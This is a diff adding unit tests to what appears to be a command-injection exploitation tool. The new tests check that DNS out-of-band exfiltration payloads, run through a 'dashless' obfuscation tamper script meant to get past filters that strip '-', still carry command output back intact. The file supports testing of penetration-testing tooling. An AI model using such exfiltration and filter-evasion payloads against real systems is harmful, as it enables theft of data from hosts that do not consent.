@@ -429,6 +429,42 @@ class TestDnsOobIntegration(unittest.TestCase):
 
     # --- hostname embedding ------------------------------------------------
 
+    # --- loop format with a '-' kept out of the payload --------------------
+
+    def _dashless(self, cmd):
+        """
+        The loop as the tamper script writes it, which is what a target stripping a '-' is sent.
+
+        The labels themselves still carry one, which is the gap that path is warned about - what is
+        asked here is whether what does get sent still comes back as the output it was made from.
+        """
+        from src.tamper.obfuscation.posix import dashlesstest
+        saved = list(settings.MULTI_ENCODED_PAYLOAD)
+        settings.MULTI_ENCODED_PAYLOAD = [settings.DASHLESS_TAMPER]
+        try:
+            with mock.patch("src.utils.settings.print_once"):
+                return dashlesstest.tamper(payloads.dns_exfil_command(HOSTNAME, cmd, ";"))
+        finally:
+            settings.MULTI_ENCODED_PAYLOAD = saved
+
+    def test_loop_round_trip_without_a_dash(self):
+        self._run(self._dashless("echo 'foo bar baz'"))
+        names = self._stub.drain()
+        self.assertNotEqual(names, [], "no DNS queries captured")
+        self.assertEqual(_reassemble(names), "foo bar baz")
+
+    def test_loop_multichunk_without_a_dash(self):
+        self._run(self._dashless("printf '%s' '" + "B" * 40 + "'"))
+        names = self._stub.drain()
+        self.assertNotEqual(names, [], "no DNS queries captured")
+        self.assertEqual(_reassemble(names), "B" * 40)
+
+    def test_loop_output_with_a_line_break_without_a_dash(self):
+        self._run(self._dashless("printf 'one\\ntwo'"))
+        names = self._stub.drain()
+        self.assertNotEqual(names, [], "no DNS queries captured")
+        self.assertEqual(_reassemble(names), "one\ntwo")
+
     def test_queries_embed_corr_id_and_token(self):
         # Every captured query name must contain the correlation id + token.
         cmd = payloads.dns_exfil_command(HOSTNAME, "echo hello", "&")
